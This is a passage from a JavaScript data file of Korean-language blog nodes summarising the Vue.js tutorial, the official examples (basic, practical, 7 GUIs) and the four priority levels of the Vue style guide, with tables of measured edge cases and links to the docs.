        body: "API 참고서가 끝났습니다. 남은 셋은 손으로 따라 치는 튜토리얼, 완성 코드를 보는 예제, 그리고 스타일 가이드입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 전부 <script setup>인 앱의 번들을 줄이려 합니다. (2) 운영 SSR에서 불일치가 어디서 나는지 모릅니다. (3) CDN 빌드에 플래그를 define했는데 변화가 없습니다.",
        notes: [
          {
            title: "답",
            body: "(1) __VUE_OPTIONS_API__: 'false'를 Vite define에 두면 Options API 지원 코드가 빠져 번들이 줍니다. 단 Vuetify·Element Plus 등 서드파티나 사내 레거시가 Options API(data·mounted 등)를 하나라도 쓰면 깨지므로 의존성 전부를 확인한 뒤에만. 실제로 Options 컴포넌트가 같은 런타임에서 동작했으니 그 코드가 빠지면 그 컴포넌트는 실패합니다. (2) __VUE_PROD_HYDRATION_MISMATCH_DETAILS__: 'true'(3.4+)로 운영 빌드에서도 불일치 상세(어느 노드·무슨 텍스트)를 내게 합니다. 비용이 있으니 진단 기간만 켜고, 원인(시간대·난수·중첩)을 고친 뒤 끕니다. 개발 빌드에서는 기본으로 상세가 나옵니다(실제로 확인). (3) 플래그는 esm-bundler 빌드(번들러가 vue를 import할 때)에서만 치환됩니다. CDN의 vue.global.js·vue.esm-browser.js는 이미 빌드된 완성본이라 define이 닿지 않습니다(문서: esm-bundler만). CDN은 .js(개발)와 .prod.js(운영) 중 고르는 것이 전부입니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Compile-Time Flags", href: `${DOCS}/api/compile-time-flags` },
      { label: "Production Deployment", href: `${DOCS}/guide/best-practices/production-deployment` },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // 튜토리얼 · 예제 · 스타일 가이드
  // ═══════════════════════════════════════════════════════════════════════════
  {
    id: "vt",
    name: "튜토리얼",
    tagline: "브라우저 안에서 손으로 따라 치는 단계별 입문 — API 스타일과 SFC/HTML 모드를 골라 가며",
    intro:
      "vuejs.org/tutorial은 문서를 읽는 대신 에디터에서 직접 고치며 배우는 단계별 입문입니다. 상단 토글로 API 선호(Options/Composition)와 포맷(SFC/HTML)을 바꿀 수 있어 네 조합 중 자기 환경에 맞는 코드를 봅니다. 단계는 가이드 필수 개념의 순서를 압축한 것입니다. 시작하기(createApp) → 선언적 렌더링(ref·reactive·{{ }}) → 속성 바인딩(:) → 이벤트 리스너(@) → 폼 바인딩(v-model) → 조건부 렌더링(v-if) → 리스트 렌더링(v-for·key) → 계산된 속성 → 라이프사이클과 템플릿 ref(onMounted) → 감시자 → 컴포넌트 → props → emits → 슬롯 → 끝(다음 단계 안내). 이 블로그는 튜토리얼 대신 각 단계의 개념을 Node·Chrome에서 직접 측정했고(가이드 필수 개념 열세 노드), 그 측정 스크립트가 튜토리얼의 '손으로 치기'에 해당합니다. 이 노드의 질문은 하나입니다. 어느 순서로 손에 익히나.",
    blocks: [
      {
        label: "단계와 대응 노드",
        body: "튜토리얼의 단계마다 이 블로그의 노드와 측정이 대응합니다. 튜토리얼 페이지 자체는 상호작용형이라 본문 텍스트가 적어 단계 수를 문서에서 확정하지 못했고(web-fetch가 빈 본문을 받음), 아래는 가이드 필수 개념의 순서로 적은 대응표입니다.",
        code: "단계 (튜토리얼)              대응 노드                  측정\n시작하기 · createApp          애플리케이션 생성             mount 두 번 경고 · errorHandler\n선언적 렌더링 · ref/reactive    반응성 기초 · 템플릿 문법       구조 분해 끊김 · {{ }} 이스케이프 · 허용 목록\n속성 바인딩 :                 템플릿 문법 · 클래스/스타일      class 병합 · 다중 루트 경고\n이벤트 리스너 @               이벤트 처리                  수식어 순서 · .once · .exact\n폼 바인딩 v-model             폼 입력 바인딩                .lazy/.number/.trim · 초기 속성 무시\n조건부 렌더링 v-if             조건부 렌더링                제거 vs display\n리스트 렌더링 v-for · key      리스트 렌더링                key 변경 리셋 · KEYED_FRAGMENT\n계산된 속성                   계산된 속성                  지연 · 캐시 · readonly\n라이프사이클 · 템플릿 ref       라이프사이클 · 템플릿 ref       훅 순서 · ref null → 요소\n감시자                       감시자                      flush · deep · await 뒤\n컴포넌트 · props · emits · 슬롯  컴포넌트 기초 · 심화           검증 경고 · emits 선언 · 폴백",
        codeLang: "text",
      },
      {
        label: "읽는 법",
        body: "토글을 Composition + SFC로 두고 따라 치면 이 블로그의 코드 블록과 같은 모양입니다. 각 단계에서 막히면 대응 노드의 '문제가 나는 경우' 표를 봅니다. 튜토리얼이 끝나면 '다음 단계'로 가이드·예제·create-vue를 안내합니다.",
      },
      {
        label: "다음 입구",
        body: "옆 노드 '예제'는 같은 개념을 완성된 코드로 보여 줍니다.",
      },
    ],
    sources: [
      { label: "Tutorial", href: `${DOCS}/tutorial/` },
      { label: "Essentials", href: `${DOCS}/guide/essentials/application` },
    ],
  },

  {
    id: "ve",
    name: "예제",
    tagline: "완성된 코드를 보는 쪽: 기본 여섯, 실전 일곱, 7 GUIs 일곱",
    intro:
      "vuejs.org/examples는 세 묶음의 완성 예제입니다. 기본(Hello World, 사용자 입력 처리, 속성 바인딩, 조건과 반복, 폼 바인딩, 간단한 컴포넌트), 실전(마크다운 에디터, 데이터 가져오기, 정렬·필터 그리드, 트리 뷰, SVG 그래프, 전환 있는 모달, 전환 있는 리스트), 7 GUIs(카운터, 온도 변환기, 항공편 예약, 타이머, CRUD, 원 그리기, 셀). 페이지 상단 토글로 Options/Composition과 HTML/SFC를 바꿔 같은 예제를 네 꼴로 봅니다. 이 블로그의 측정 페이지(probe1·probe2)가 사실상 '실전 예제'의 축소판입니다. 전환 있는 모달(Teleport + Transition), 전환 있는 리스트(TransitionGroup), 데이터 가져오기(watch + fetch), 폼 바인딩(v-model 수식어). 이 노드의 자식 셋이 세 묶음입니다.",
    blocks: [
      {
        label: "세 묶음 한눈에",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "묶음        예제                                                                       쓰는 것\n기본        Hello World · 사용자 입력 · 속성 바인딩 · 조건과 반복 · 폼 바인딩 · 간단한 컴포넌트          ref · {{ }} · : · @ · v-if · v-for · v-model · props\n실전        마크다운 에디터 · 데이터 가져오기 · 정렬·필터 그리드 · 트리 뷰 · SVG 그래프 · 전환 모달 · 전환 리스트   computed · watch+fetch · 재귀 컴포넌트 · :style/SVG · Teleport+Transition · TransitionGroup\n7 GUIs      카운터 · 온도 변환기 · 항공편 예약 · 타이머 · CRUD · 원 그리기 · 셀                         양방향 computed · 날짜 검증 · setInterval+onUnmounted · 필터+선택 · undo/redo · 재귀 평가",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "자식 셋, 기본·실전·7 GUIs입니다.",
      },
    ],
    sources: [{ label: "Examples", href: `${DOCS}/examples/` }],
  },

  {
    id: "ve-basic",
    name: "기본 예제",
    tagline: "Hello World, 사용자 입력, 속성 바인딩, 조건과 반복, 폼 바인딩, 간단한 컴포넌트",
    intro:
      "예제의 첫 묶음 여섯입니다. 각각 필수 개념 한두 페이지를 가장 작은 코드로 보입니다. Hello World(ref + {{ }}), 사용자 입력 처리(@click·v-model), 속성 바인딩(:title·:class·:style), 조건과 반복(v-if·v-for·key), 폼 바인딩(text·checkbox·radio·select·v-model 수식어), 간단한 컴포넌트(props로 자식 렌더). 이 블로그의 측정이 각 예제의 '가장자리'를 보여 줍니다. 이 노드의 질문은 하나입니다. 여섯 예제의 코드 한 줄이 어느 규칙 위에 있나.",
    blocks: [
      {
        label: "여섯과 측정",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "예제                핵심 코드                                               가장자리 (측정)\nHello World         const message = ref('Hello World!') · {{ message }}            최상위 ref 풀림 · 중첩은 '[object Object]'\n사용자 입력          <button @click=\"reverse\"> · <input v-model=\"message\">          v-model 초기 속성 무시 · set 직후 DOM 옛 값\n속성 바인딩          :title · :class=\"{ active }\" · :style=\"{ color }\"              class 병합 · style 숫자 단위 없음\n조건과 반복          v-if/v-else · v-for :key                                     v-if 제거 · v-show display · key 변경 리셋\n폼 바인딩            text · checkbox 배열 · radio · select · .lazy .number .trim       '12abc'→12 · select 불일치 -1 · textarea 보간 X\n간단한 컴포넌트       <TodoItem v-for :todo :key> · defineProps(['todo'])             검증 경고 · 정적 속성은 문자열",
        codeLang: "text",
      },
      {
        label: "읽는 법",
        body: "예제 코드를 Composition + SFC 토글로 두고 보면 <script setup> 꼴입니다. 각 줄의 '왜'는 필수 개념 노드에, '깨지는 자리'는 그 노드의 표에 있습니다. 예제는 깨지지 않는 최소 코드이므로 가장자리는 이 블로그의 측정에서 봅니다.",
      },
      {
        label: "다음 입구",
        body: "다음 묶음 '실전 예제'는 여러 개념이 조합된 코드입니다.",
      },
    ],
    sources: [{ label: "Examples — Basic", href: `${DOCS}/examples/#hello-world` }],
  },

  {
    id: "ve-practical",
    name: "실전 예제",
    tagline: "마크다운 에디터, 데이터 가져오기, 정렬·필터 그리드, 트리 뷰, SVG 그래프, 전환 모달, 전환 리스트",
    intro:
      "예제의 둘째 묶음 일곱입니다. 개념이 조합된 작은 앱들입니다. 마크다운 에디터(textarea v-model + computed로 marked 변환 + v-html. 디바운스), 데이터 가져오기(watchEffect + fetch + 로딩/에러 상태. 경쟁 조건), 정렬·필터 그리드(computed로 필터·정렬. 원본 보호), 트리 뷰(재귀 컴포넌트. 파일명 name), SVG 그래프(:points 등 속성 바인딩 + Transition), 전환 있는 모달(Teleport + Transition + v-if), 전환 있는 리스트(TransitionGroup + move). 이 블로그의 측정이 각 예제의 핵심 메커니즘을 재어 두었습니다. 이 노드의 질문은 하나입니다. 일곱 예제에서 조합되는 개념은 무엇이고 어디서 깨지나.",
    blocks: [
      {
        label: "일곱과 측정",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "예제              조합                                                    깨지는 자리 (측정)\n마크다운 에디터     v-model(textarea) · computed(marked) · v-html · 디바운스          v-html XSS (소독) · 디바운스는 customRef\n데이터 가져오기     watchEffect · fetch(toValue(url)) · loading/error ref           await 뒤 미추적 · 경쟁 조건 (onCleanup)\n정렬·필터 그리드    computed(filter) · computed(sort — 복사)                      computed 안 sort 가 원본 변경\n트리 뷰           재귀 컴포넌트 (파일명 name) · v-for · @click 토글                 name 없으면 자기 참조 실패\nSVG 그래프        :points · :transform · <Transition> · :style                  Transition 자식 하나 · 레이아웃 속성 비용\n전환 모달         <Teleport to=\"body\"> · <Transition> · v-if                     타깃 먼저 존재 · 자식 하나 · 접근성은 직접\n전환 리스트        <TransitionGroup tag=\"ul\"> · :key · .list-move · leave absolute   key 필수 · absolute 로 흐름에서 빼기",
        codeLang: "text",
      },
      {
        label: "읽는 법",
        body: "각 예제의 조합을 노드로 쪼개면 가이드 2~5장입니다. 깨지는 자리는 이 블로그의 측정(실제로 돌려 보면)이 보여 주고, 처방은 해당 노드의 '문제가 나는 경우' 표에 있습니다.",
      },
      {
        label: "다음 입구",
        body: "마지막 묶음 '7 GUIs'는 GUI 프로그래밍 벤치마크 일곱 과제입니다.",
      },
    ],
    sources: [{ label: "Examples — Practical", href: `${DOCS}/examples/#markdown` }],
  },

  {
    id: "ve-7guis",
    name: "7 GUIs",
    tagline: "카운터, 온도 변환기, 항공편 예약, 타이머, CRUD, 원 그리기, 셀 — GUI 벤치마크 일곱을 Vue 로",
    intro:
      "예제의 셋째 묶음입니다. 7 GUIs는 GUI 프로그래밍 접근법을 비교하기 위한 표준 과제 일곱입니다. 카운터(ref 하나), 온도 변환기(양방향 변환. computed get/set 또는 두 ref + watch), 항공편 예약(select + 날짜 입력 + 검증 + 비활성화), 타이머(setInterval + 진행률 + onUnmounted 정리), CRUD(필터 + 선택 + 생성·수정·삭제. computed 필터와 key), 원 그리기(SVG 클릭 + undo/redo 스택 + 모달 조절), 셀(스프레드시트. 재귀 평가 + computed 그리드). 각 과제가 Vue의 어느 개념을 요구하는지가 요지입니다. 이 노드의 질문은 하나입니다. 일곱 과제가 각각 어느 개념의 시험인가.",
    blocks: [
      {
        label: "일곱과 개념",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "과제          시험하는 것                              Vue 개념                                     측정\n카운터         상태 하나 · 갱신                           ref · @click                                 묶음 갱신 · nextTick\n온도 변환기     양방향 파생 (C ↔ F)                        computed { get, set } · 또는 watch 쌍             쓰기 가능 computed 동작\n항공편 예약     제약 · 검증 · 비활성화                      v-model · computed(유효성) · :disabled             select 불일치 · .number\n타이머         시간 · 정리                               setInterval · onUnmounted · 진행률 computed          훅 순서 · unmounted 정리\nCRUD          필터 · 선택 · 변이                          computed(filter) · v-for :key · 변이 메서드          key 정체 · computed 안 변이 금지\n원 그리기       SVG · undo/redo · 모달                     :cx :cy · 히스토리 배열 · Teleport/Transition        배열 교체 추적 · Teleport 타깃\n셀            재귀 평가 · 큰 그리드                        computed 셀 · 재귀 컴포넌트 · v-memo/가상화          computed 안정성 · 성능",
        codeLang: "text",
      },
      {
        label: "읽는 법",
        body: "온도 변환기와 셀이 Vue에서 가장 짧은 과제입니다. 양방향 computed와 셀마다 computed가 '파생을 선언하면 갱신은 런타임이'라는 Vue의 핵심을 그대로 쓰기 때문입니다. 타이머와 CRUD는 수명·정체(unmounted 정리, key)의 시험입니다.",
      },
      {
        label: "다음 입구",
        body: "옆 노드 '스타일 가이드'는 이 모든 코드를 어떻게 쓰면 좋은지의 규칙 모음입니다.",
      },
    ],
    sources: [
      { label: "Examples — 7 GUIs", href: `${DOCS}/examples/#counter` },
      { label: "7GUIs", href: "https://eugenkiss.github.io/7guis/" },
    ],
  },

  {
    id: "vs",
    name: "스타일 가이드",
    tagline: "Vue 전용 코드 규칙을 네 등급으로: A 필수(에러 방지), B 적극 권장, C 권장, D 주의",
    intro:
      "vuejs.org/style-guide는 'Vue 전용 코드의 공식 스타일 가이드'입니다. 네 우선순위. A 필수(에러 방지. 5개), B 적극 권장(가독성·개발자 경험. 15개), C 권장(일관성. 4개), D 주의해서 사용(잠재적 위험. 2개). 규칙 상당수가 이 블로그의 측정에서 '깨지는 자리'로 확인됩니다. 다중 단어 컴포넌트 이름(네이티브 요소 충돌), 상세한 prop 정의(검증 경고가 그 이득), keyed v-for(key 변경 리셋·move), v-if와 v-for 분리(변수 못 읽음), 컴포넌트 범위 스타일(scoped 해시), 요소 선택자 with scoped(p[data-v]), 암묵적 부모-자식 통신($parent·prop 변경 경고). 이 노드의 자식 넷이 네 등급입니다.",
    blocks: [
      {
        label: "네 등급 한눈에",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "등급              수    규칙\nA 필수            5     다중 단어 컴포넌트 이름 · 상세한 prop 정의 · keyed v-for · v-if 와 v-for 분리 · 컴포넌트 범위 스타일\nB 적극 권장        15    컴포넌트 파일 · 파일명 케이스 · Base 접두 · 긴밀 결합 이름 · 단어 순서 · 자기 닫힘 · 템플릿 케이스 · JS 케이스 · 완전한 단어 · prop 케이스 · 다중 속성 줄바꿈 · 단순 식 · 단순 computed · 속성 값 따옴표 · 축약 일관\nC 권장            4     옵션 순서 · 요소 속성 순서 · 옵션 사이 빈 줄 · SFC 블록 순서\nD 주의            2     scoped 요소 선택자 · 암묵적 부모-자식 통신",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "자식 넷, A·B·C·D입니다.",
      },
    ],
    sources: [{ label: "Style Guide", href: `${DOCS}/style-guide/` }],
  },

  {
    id: "vs-essential",
    name: "A - 필수",
    tagline: "에러를 막는 다섯: 다중 단어 이름, 상세한 prop, keyed v-for, v-if/v-for 분리, 범위 스타일",
    intro:
      "스타일 가이드 A 등급 다섯입니다. '에러 방지'가 목적이라 거의 늘 따릅니다. 1. 다중 단어 컴포넌트 이름(루트 App 제외. <todo-item>처럼. 현재·미래의 HTML 요소와 충돌 방지). 2. 상세한 prop 정의(최소 type. 문서화·검증 경고·개발 중 잡기). 3. keyed v-for(컴포넌트에는 늘 key. 상태 유지·예측 가능한 동작). 4. v-if와 v-for 분리(같은 요소에 두지 말고 computed로 거르거나 <template v-for>로 감싸기). 5. 컴포넌트 범위 스타일(앱 수준은 전역이어도 되지만 컴포넌트는 scoped·CSS 모듈·BEM. 라이브러리는 클래스 기반 전략 선호). 실제로 돌려 보면 2는 검증 경고 셋이 그 이득이고, 3은 key 변경이 요소를 새로 만들고 index key가 상태를 옆으로 흘리는 것, 4는 같은 요소 v-if+v-for가 컴파일은 통과하되 런타임에 변수를 못 읽는 것, 5는 scoped가 선택자에 해시를 붙이는 것입니다. 이 노드의 질문은 하나입니다. 다섯은 각각 어떤 에러를 막나.",
    blocks: [
      {
        label: "다섯과 막는 에러",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "규칙                      막는 에러                                              측정\n다중 단어 컴포넌트 이름        <button> <input> 등 HTML 요소와 충돌 · in-DOM 소문자화에서도 구분       <MyRow> → <myrow> 소문자화 · 미등록 태그는 네이티브로\n상세한 prop 정의             잘못된 타입·누락이 조용히 지나감                              검증 경고: validator · type check failed (String '3') · Missing required\nkeyed v-for                 상태·DOM 이 옆 항목으로 샘 · 전환 어긋남                       key 변경 → input 리셋 · TransitionGroup key 필수 경고 · move\nv-if 와 v-for 분리           v-if 가 먼저라 v-for 변수 못 읽음 · 매 렌더 전체 순회             같은 요소는 컴파일 통과 · 런타임 에러 (문서)\n컴포넌트 범위 스타일           전역 CSS 충돌 · 다른 컴포넌트에 누출                          scoped → .a[data-v-abc123] · 자식 안쪽은 :deep",
        codeLang: "text",
      },
      {
        label: "읽는 법",
        body: "A 등급은 ESLint(eslint-plugin-vue의 vue/multi-word-component-names·vue/require-prop-types·vue/require-v-for-key·vue/no-use-v-if-with-v-for)가 대부분 잡습니다. 툴링 노드의 린트 설정이 이 등급의 자동화입니다.",
      },
      {
        label: "다음 입구",
        body: "다음 등급 'B - 적극 권장'은 가독성과 일관성의 열다섯입니다.",
      },
    ],
    sources: [{ label: "Priority A Rules: Essential", href: `${DOCS}/style-guide/rules-essential` }],
  },

  {
    id: "vs-strong",
    name: "B - 적극 권장",
    tagline: "가독성과 개발자 경험의 열다섯: 파일·이름·케이스·자기 닫힘·속성 줄바꿈·단순 식·축약 일관",
    intro:
      "스타일 가이드 B 등급 열다섯입니다. '대부분의 프로젝트에서 가독성과 개발자 경험을 높인다'. 1. 컴포넌트 파일(빌드 있으면 파일당 하나). 2. SFC 파일명 케이스(늘 PascalCase 또는 늘 kebab-case). 3. Base 컴포넌트 이름(Base·App·V 접두). 4. 긴밀 결합 컴포넌트 이름(부모 이름 접두. TodoListItem). 5. 이름의 단어 순서(최상위 단어 먼저. SearchButtonClear). 6. 자기 닫힘 컴포넌트(SFC·문자열 템플릿·JSX에서는 <MyComponent/>, in-DOM에서는 절대 X). 7. 템플릿 컴포넌트 이름 케이스(SFC·문자열은 PascalCase, in-DOM은 kebab-case). 8. JS/JSX 컴포넌트 이름(PascalCase). 9. 완전한 단어(약어 X). 10. prop 이름 케이스(선언 camelCase, in-DOM 템플릿 kebab-case. 일관). 11. 다중 속성 요소(한 줄에 하나). 12. 템플릿의 단순 식(복잡 로직은 computed·메서드). 13. 단순 computed(여럿으로 쪼개기). 14. 속성 값 따옴표(비어 있지 않으면 늘). 15. 디렉티브 축약(: @ # 늘 쓰거나 늘 안 쓰기). 실제로 돌려 보면 6과 7은 in-DOM 측정(<my-row/>가 뒤 형제를 삼키고 <MyRow>가 소문자로)이 근거이고, 12는 템플릿 식이 갱신마다 평가되는 것(computed는 캐시)이 근거입니다. 이 노드의 질문은 하나입니다. 열다섯은 각각 무엇을 쉽게 하나.",
    blocks: [
      {
        label: "열다섯과 이유",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "규칙                     쉽게 하는 것                                      근거 (측정)\n1 컴포넌트 파일            찾기 · import                                       -\n2 파일명 케이스            대소문자 구분 파일시스템 · 자동완성                       -\n3 Base 접두              표현 전용 컴포넌트 묶어 보기 · 전역 등록 후보                 등록 노드 (전역은 접두)\n4 긴밀 결합 이름           부모 옆에 정렬 · 관계 표시                              -\n5 단어 순서              검색·정렬 (Search* · Settings*)                       -\n6 자기 닫힘              '자식 없음' 표시 · 단 in-DOM 금지                        <my-row/> 가 뒤 형제 삼킴 (in-DOM)\n7 템플릿 이름 케이스        네이티브와 구분 · in-DOM 은 kebab                       <MyRow> → <myrow> 소문자화\n8 JS 이름 케이스          클래스·생성자와 일관                                   -\n9 완전한 단어             검색·이해 (Btn → Button)                               -\n10 prop 케이스            JS camel · HTML kebab 변환 (Vue 가 함)                   in-DOM 속성 소문자화\n11 속성 줄바꿈            diff · 읽기                                          -\n12 단순 식               갱신마다 평가되는 식을 줄임                              computed 캐시 vs 템플릿 식 매 렌더\n13 단순 computed          재사용 · 테스트 · 이름이 뜻                             computed 지연·캐시\n14 따옴표                공백 있는 값 안전                                     -\n15 축약 일관              눈에 익은 패턴                                        -",
        codeLang: "text",
      },
      {
        label: "읽는 법",
        body: "B 등급의 상당수(2·6·7·8·10·11·14·15)는 eslint-plugin-vue와 Prettier가 자동으로 맞춰 줍니다. 손으로 지킬 것은 이름(3·4·5·9)과 템플릿 식의 복잡도(12·13)입니다.",
      },
      {
        label: "다음 입구",
        body: "다음 등급 'C - 권장'은 순서 규칙 넷입니다.",
      },
    ],
    sources: [{ label: "Priority B Rules: Strongly Recommended", href: `${DOCS}/style-guide/rules-strongly-recommended` }],
  },

  {
    id: "vs-recommended",
    name: "C - 권장",
    tagline: "일관성의 넷: 옵션 순서, 요소 속성 순서, 옵션 사이 빈 줄, SFC 블록 순서",
    intro:
      "스타일 가이드 C 등급 넷입니다. '여러 좋은 선택이 있을 때 하나로 일관되게'. 1. 컴포넌트/인스턴스 옵션 순서(name → compilerOptions → components/directives → extends/mixins/provide/inject → inheritAttrs/props/emits/expose → setup → data/computed → watch·라이프사이클 훅(호출 순서) → methods → template/render). 2. 요소 속성 순서(is → v-for → v-if/v-else/v-show/v-cloak → v-pre/v-once → id → ref/key → v-model → 기타 속성 → v-on → v-html/v-text). 3. 옵션 사이 빈 줄(여러 줄 프로퍼티 사이. 선택). 4. SFC 최상위 블록 순서(<script> <template> <style>를 일관되게. <style>은 마지막). 측정과 직접 관련은 적고, 2의 순서가 '정체(key) → 모델 → 이벤트'로 읽히는 흐름이고 1이 '정의 → 상태 → 반응 → 동작 → 렌더'의 흐름이라는 점이 가이드 순서와 맞습니다. 이 노드의 질문은 하나입니다. 순서는 왜 그 순서인가.",
    blocks: [
      {
        label: "넷과 그 순서의 논리",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "규칙                 순서                                                                               논리\n옵션 순서             name · compilerOptions → components/directives → extends/mixins/provide/inject → inheritAttrs/props/emits/expose → setup → data/computed → watch/훅 → methods → template/render   정의 → 조합 → 인터페이스 → 상태 → 반응 → 동작 → 렌더\n속성 순서             is → v-for → v-if 류 → v-pre/v-once → id → ref/key → v-model → 기타 → v-on → v-html/v-text                  정의 → 반복 → 조건 → 렌더 제어 → 정체 → 바인딩 → 이벤트 → 내용\n빈 줄                여러 줄 프로퍼티 사이 (선택)                                                                  스크롤 가독성\nSFC 블록 순서         <script> <template> <style> 일관 · <style> 마지막                                                  템플릿·스크립트 중 하나가 먼저 · 스타일은 늘 끝",
        codeLang: "text",
      },
      {
        label: "읽는 법",
        body: "eslint-plugin-vue의 vue/order-in-components·vue/attributes-order·vue/block-order가 1·2·4를 자동으로 맞춥니다. 팀이 다른 순서를 택해도 되되 린트로 고정하는 것이 요지입니다.",
      },
      {
        label: "다음 입구",
        body: "마지막 등급 'D - 주의해서 사용'은 위험 가능성이 있는 둘입니다.",
      },
    ],
    sources: [{ label: "Priority C Rules: Recommended", href: `${DOCS}/style-guide/rules-recommended` }],
  },

  {
    id: "vs-caution",
    name: "D - 주의해서 사용",
    tagline: "잠재적 위험 둘: scoped 의 요소 선택자, 암묵적 부모-자식 통신",
    intro:
      "스타일 가이드 D 등급 둘입니다. '존재하되 피하는 게 나은, 드문 경우에만'. 1. scoped의 요소 선택자(p { } 대신 class. scoped는 선택자에 [data-v-해시]를 붙이고, 요소 선택자는 브라우저가 모든 그 요소를 검사해 느림). 2. 암묵적 부모-자식 통신(this.$parent로 올라가거나 prop을 자식이 바꾸는 대신 props와 이벤트). 실제로 돌려 보면 1은 compileStyle이 p를 p[data-v-abc123]으로 바꾸는 것(모든 p를 속성 검사), 2는 자식의 props 쓰기가 'Set operation on key \"x\" failed: target is readonly.' 경고이고 객체 안 변경은 조용히 부모를 바꾸는 것입니다. 이 노드의 질문은 하나입니다. 둘은 왜 '금지'가 아니라 '주의'인가.",
    blocks: [
      {
        label: "둘과 측정",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "규칙                      위험                                                        측정                                                     대안\nscoped 요소 선택자          p[data-v-hash] — 모든 p 를 속성 검사 → 느림 · 자식 요소까지 영향        compileStyle: p { } → p[data-v-abc123] { }                       클래스 선택자 (.text[data-v-hash])\n암묵적 부모-자식 통신        $parent 의존 · prop 변경 → 데이터 흐름 추적 불가 · 구조 변경에 깨짐       props.x = 2 → readonly 경고 · props.o.a = 2 → 부모 조용히 변경     props 아래로 · emit 위로 · v-model · provide/inject",
        codeLang: "text",
      },
      {
        label: "읽는 법",
        body: "'주의'인 이유는 동작은 하기 때문입니다. 요소 선택자는 작은 컴포넌트에서 체감이 없고, $parent는 긴밀히 결합된 컴포넌트 쌍(탭·탭 패널)에서 드물게 정당합니다. 그래도 기본은 대안이고, 쓸 때는 주석으로 이유를 남깁니다.",
      },
      {
        label: "다음 입구",
        body: "Vue 노드가 끝났습니다. 옆 허브로 가면 React 노드가 같은 문제(상태·경계·전환·SSR)를 다른 모델(순수 함수 재호출)로 풉니다. i18n 노드 8단계(반응형 로케일·스코프)와 12단계(SSR)는 이 Vue 노드의 반응성·SSR 위에 서 있습니다.",
      },
    ],
    sources: [{ label: "Priority D Rules: Use with Caution", href: `${DOCS}/style-guide/rules-use-with-caution` }],
  },
];
